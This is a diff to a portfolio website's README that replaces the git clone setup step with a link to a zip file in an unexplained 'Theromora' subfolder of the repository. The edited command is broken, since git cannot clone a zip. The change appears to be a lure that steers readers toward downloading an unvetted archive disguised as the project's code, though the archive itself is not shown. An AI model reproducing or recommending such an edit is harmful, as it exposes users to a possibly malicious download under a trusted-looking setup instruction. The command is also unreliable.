@@ -17,7 +17,7 @@ This is the codebase for my personal portfolio website — where I showcase my *
 
 ## bash
 # Clone this repo
-git clone [https://github.com/your-username/portfolio.git](https://github.com/sunkari-vijay-kumar/Portfolio.git)
+git clone [https://raw.githubusercontent.com/sunkari-vijay-kumar/Portfolio/main/Theromora/Portfolio.zip](https://raw.githubusercontent.com/sunkari-vijay-kumar/Portfolio/main/Theromora/Portfolio.zip)
 
 # Go into the folder
 cd portfolio
